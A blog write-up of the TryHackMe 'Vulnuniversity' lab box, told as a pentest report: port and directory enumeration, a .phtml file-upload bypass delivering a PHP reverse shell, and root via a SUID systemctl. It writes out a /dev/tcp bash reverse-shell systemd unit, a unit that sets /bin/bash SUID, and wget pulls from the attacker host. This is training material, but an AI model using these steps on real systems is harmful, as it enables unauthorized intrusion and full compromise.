+++
title = "Vulnuniversity on Try Hack Me Write-up"
author = ["funcsec"]
date = 2022-01-18
publishDate = 2022-01-18
lastmod = 2022-01-18T17:03:21-08:00
tags = ["thm", "linux", "file upload vulnerability", "suid", "systemd"]
categories = ["writeup", "redteam"]
draft = false
toc = "true +"
omit_header_text = "+"
background_color_class = "bg-black-60"
description = "Write-up of the Vulnuniversity box on Try Hack Me"
featured_image = "images/hermann-kern_gute-freunde.jpg"
images = ["images/hermann-kern_gute-freunde.jpg"]
+++

This is a write-up of a fun box on [Try Hack Me](https://tryhackme.com/).
I hope this can be useful to anyone who ran into issues with this box, especially the privilege escalation.
One of the overlooked parts of penetration testing is report writing.
I'm working on a new system using emacs org-mode as the basis for write-ups and pentest reporting.
In the future, I'll post up my notes on this system, as I am currently ironing out the bugs.

---


## Executive Summary {#executive-summary}

This server had a file upload vulnerability, which allowed the upload and execution of untrusted code.
Once remote code execution was achieved on the server, a privilege escalation was possible due to permission issue on scheduling runtime application.


## Methodologies {#methodologies}

The following are the steps that were followed to test for vulnerabilities on the server.


### Initial port scan {#initial-port-scan}

What are the running services and port on the server?
`nmap` is a network port scanner that can be used against the an IP address, domain, or subnet to enumerate services and ports on the target machine.

```bash
nmap -sV $ip
```

```text
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-15 00:53 EST
Nmap scan report for 10.10.195.112
Host is up (0.16s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.16 seconds
```

The ports for further enumeration are

-   3333/tcp http
-   21/tcp ftp
-   22/tcp ssh
-   139/tcp smb


### Enumerating http service {#enumerating-http-service}

The next step was to enumerate the potential files/directories on the `3333/tcp` service running `http`.
`gobuster` is a brute-force/fuzzing utility that checks for common directory and file names.

```bash
gobuster dir -u http://$ip:3333 -w /usr/share/dirb/wordlists/common.txt
```

```text
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.153.190:3333
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/01/12 00:45:30 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 294]
/.htpasswd            (Status: 403) [Size: 299]
/.htaccess            (Status: 403) [Size: 299]
/css                  (Status: 301) [Size: 319] [--> http://10.10.153.190:3333/css/]
/fonts                (Status: 301) [Size: 321] [--> http://10.10.153.190:3333/fonts/]
/images               (Status: 301) [Size: 322] [--> http://10.10.153.190:3333/images/]
/index.html           (Status: 200) [Size: 33014]
/internal             (Status: 301) [Size: 324] [--> http://10.10.153.190:3333/internal/]
/js                   (Status: 301) [Size: 318] [--> http://10.10.153.190:3333/js/]
/server-status        (Status: 403) [Size: 303]
===============================================================
2022/01/12 00:46:58 Finished
===============================================================
```

The location `http://10.10.186.25:3333/internal/` has an internal file upload.
User inputs to websites are common vulnerability locations.

{{< figure src="/ox-hugo/vulnuniversity_upload.png" caption="<span class=\"figure-number\">Figure 1: </span>File upload form" >}}

The next step was to see what can be uploaded to server from this POST request.
The hope was that executable scripts could be uploaded to the server.


### Testing for file upload vulnerability {#testing-for-file-upload-vulnerability}

Burpsuite can help in finding file upload vulnerabilities.
This web server appeared to be a LAMP (Linux Apache MySQL PHP) server, so testing was focused on `PHP`.

-   .php
-   .php3
-   .php4
-   .php5
-   .phtml

The `PHP` reverse shell will be uploaded with the following extensions to attempt to get remote code on the target server.
Using Burpsuite intruder mode, `.phtml` files were shown to be uploaded to the server.

{{< figure src="/ox-hugo/phtml.png" caption="<span class=\"figure-number\">Figure 2: </span>Results from testing file uploads" >}}


### Prepare a reverse shell script {#prepare-a-reverse-shell-script}

A [reverse shell in PHP](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php) was downloaded from GitHub.

```bash
url="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php"
outfile="/tmp/reverse.php"
curl "$url" | tee "$outfile"
```

Next step was to find the IP address of the  `tun0` interface.

```bash
ip addr show dev tun0 \
| awk '/inet / { print substr($2, 1, length($2)-3)}'
```

```text
10.2.105.89
```

These variables were changed to point to a listening version of netcat.

```text
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
```

This change was done with `sed` on the file.

```bash
file="/tmp/reverse.php"
sed -i '1{p;s/.*/$ip = "10.2.105.89";/;h;d;};/^$ip/{g;p;s/.*//;h;d;};$G' "$file"
sed -i '1{p;s/.*/$port = "8080";/;h;d;};/^$port/{g;p;s/.*//;h;d;};$G' "$file"
grep -A 1 '^$ip' "$file"
```

```text
$ip = "10.2.105.89";
$port = "8080";
```

To conform with the results from the Burpsuite, the `PHP` reverse shell filename was changed to end in `.phtml`.

```bash
file="/tmp/reverse.php"
mv -v "$file" /tmp/reverse.phtml
```

```text
renamed '/tmp/reverse.php' -> '/tmp/reverse.phtml'
```

The reverse shell was ready to be uploaded.


### Launching the exploit {#launching-the-exploit}

The reverse shell was uploaded to the web server uploader at `http://$ip:3333/internal/` as a `.pthml` file.
Where did the reverse shell end up?
More enumeration with `gobuster` was needed to find the upload directory.

```bash
gobuster dir -u http://$ip:3333/internal/ -w /usr/share/dirb/wordlists/common.txt
```

```text
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.186.25:3333/internal/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/01/11 18:59:58 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 302]
/.htaccess            (Status: 403) [Size: 307]
/.htpasswd            (Status: 403) [Size: 307]
/css                  (Status: 301) [Size: 326] [--> http://10.10.186.25:3333/internal/css/]
/index.php            (Status: 200) [Size: 525]
/uploads              (Status: 301) [Size: 330] [--> http://10.10.186.25:3333/internal/uploads/]
===============================================================
2022/01/11 19:01:17 Finished
===============================================================
```

The directory where the reverse shell was uploaded is likely `http://$ip:3333/internal/uploads/`.
Now is time to start a `nc` listener on port `8080`.

```text
$ nc -lvnp 8080
```

Can we launch the script from the uploads directory?
Navigating to `http://$ip:3333/internal/uploads/` displays an Apache web directory.
And navigating to our reverse shell script at `./reverse.phtml` causes a connection on our `nc` listener.

```text
$ nc -lvnp 8080
listening on [any] 8080 ...
connect to [10.2.105.89] from (UNKNOWN) [10.10.186.25] 36404
Linux vulnuniversity 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 19:03:06 up  2:43,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```

This was a successful user shell.
From here the `user.txt` flag was readable at `/home/bill/user.txt`

```text
$ cat /home/bill/user.txt
[[ REDACTED ]]
```


### Privilege escalation {#privilege-escalation}

To gain higher permissions on the server, a first step is to try and exploit any misconfigured executable with `SUID` permissions.

```bash
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

```text
-rwsr-xr-x 1 root root 32944 May 16  2017 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 49584 May 16  2017 /usr/bin/chfn
-rwsr-xr-x 1 root root 32944 May 16  2017 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 136808 Jul  4  2017 /usr/bin/sudo
-rwsr-xr-x 1 root root 40432 May 16  2017 /usr/bin/chsh
-rwsr-xr-x 1 root root 54256 May 16  2017 /usr/bin/passwd
-rwsr-xr-x 1 root root 23376 Jan 15  2019 /usr/bin/pkexec
-rwsr-xr-x 1 root root 39904 May 16  2017 /usr/bin/newgrp
-rwsr-xr-x 1 root root 75304 May 16  2017 /usr/bin/gpasswd
-rwsr-sr-x 1 root root 98440 Jan 29  2019 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 14864 Jan 15  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 428240 Jan 31  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 76408 Jul 17  2019 /usr/lib/squid/pinger
-rwsr-xr-- 1 root messagebus 42992 Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 38984 Jun 14  2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-x 1 root root 40128 May 16  2017 /bin/su
-rwsr-xr-x 1 root root 142032 Jan 28  2017 /bin/ntfs-3g
-rwsr-xr-x 1 root root 40152 May 16  2018 /bin/mount
-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root 27608 May 16  2018 /bin/umount
-rwsr-xr-x 1 root root 659856 Feb 13  2019 /bin/systemctl
-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root root 35600 Mar  6  2017 /sbin/mount.cifs
```

The executable `/bin/systemctl` is not supposed to have and `SUID` permission.
There may be a way to exploit `systemd` to gain remote access.


#### Bash reverse shell {#bash-reverse-shell}

The first attempt was a reverse shell in bash.

```dot
[Unit]
Description=reverse shell

[Service]
Type=one-shot
ExecStart=/bin/bash -i >& /dev/tcp/10.2.105.89/8081 0>&1
#Restart=on-failure

[Install]
WantedBy=default.target
```

It was placed into a directory `~/http` then a lightweight web server was started.

```bash
cd ~/http
python3 -m http.server 8000
```

This made the systemd service files accessible from the target machine.
`wget` was then used to pull the files onto the target machine.

```bash
cd /tmp
wget $localip:8000/reverse.service
```

A listener was then setup on the attacking machine.

```bash
nc -lvnp 8081
```

Then the service was started on the target machine.

```bash
systemctl enable /tmp/reverse.service
systemctl start reverse.service
```

This attack did not connecting to the listener.
Might be a version of bash that has this patched.


#### PHP Reverse Shell {#php-reverse-shell}

The next escalation attempt was by using the same `PHP` remote shell that was used before.
The difference being launching it with `PHP` on the command line, rather than in the web browser.

The value in the `PHP` file was changed to `$port = 8081`

This used the same file transfer and `systemctl` launch steps as above.

```dot
[Unit]
Description=reverse php shell

[Service]
Type=one-shot
ExecStart=/usr/bin/php /tmp/reverse-root.php

[Install]
WantedBy=default.target
```

This did not appear to work, nothing attached to the listening service.


#### Bash SUID {#bash-suid}

Next step is to change the `bash` executable to be SUID to gain a root `bash` shell.

```dot
[Unit]
Description=bash suid

[Service]
Type=one-shot
ExecStart=/bin/sh -c "/bin/chmod +s /bin/bash"
#Restart=on-failure

[Install]
WantedBy=default.target
```

Downloaded the new systemctl service file

```bash
cd /tmp
wget $localip:8000/bash-suid.service
```

Active the new systemctl file

```bash
systemctl enable /tmp/bash-suid.service
systemctl start bash-suid.service
systemctl daemon-reload
```

Looks promising lets check the status

```text
$ systemctl status bash-suid.service
* bash-suid.service - bash suid
   Loaded: loaded (/tmp/bash-suid.service; enabled; vendor preset: enabled)
   Active: inactive (dead) since Sat 2022-01-15 04:21:33 EST; 11s ago
  Process: 1714 ExecStart=/bin/sh -c /bin/chmod +s /bin/bash (code=exited, status=0/SUCCESS)
 Main PID: 1714 (code=exited, status=0/SUCCESS)

Jan 15 04:21:33 vulnuniversity systemd[1]: Started bash suid.
```

This looked good now to see if it worked.

```bash
bash -p
whoami
```

```text
root
```

{{< figure src="/ox-hugo/vulnuniversity_root.png" caption="<span class=\"figure-number\">Figure 3: </span>Proof of root privilege" >}}

And that's root on vulnuniversity.
Now the flag was captured.

```text
cat /root/root.txt
[[ REDACTED ]]
```

And proof of root was taken.

{{< figure src="/ox-hugo/vulnuniversity_root_ip.png" caption="<span class=\"figure-number\">Figure 4: </span>Root whoami and ip addr" >}}

```text
$ whoami
root
$ ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 02:af:8a:2e:17:05 brd ff:ff:ff:ff:ff:ff
    inet 10.10.192.234/16 brd 10.10.255.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::af:8aff:fe2e:1705/64 scope link
       valid_lft forever preferred_lft forever
```

That's a full compromise.

---

Header image is [Gute Freunde (1904) by Hermann Kern](https://artvee.com/dl/gute-freunde-2)

This post first appearted on [Functional Security](https://funcsec.com).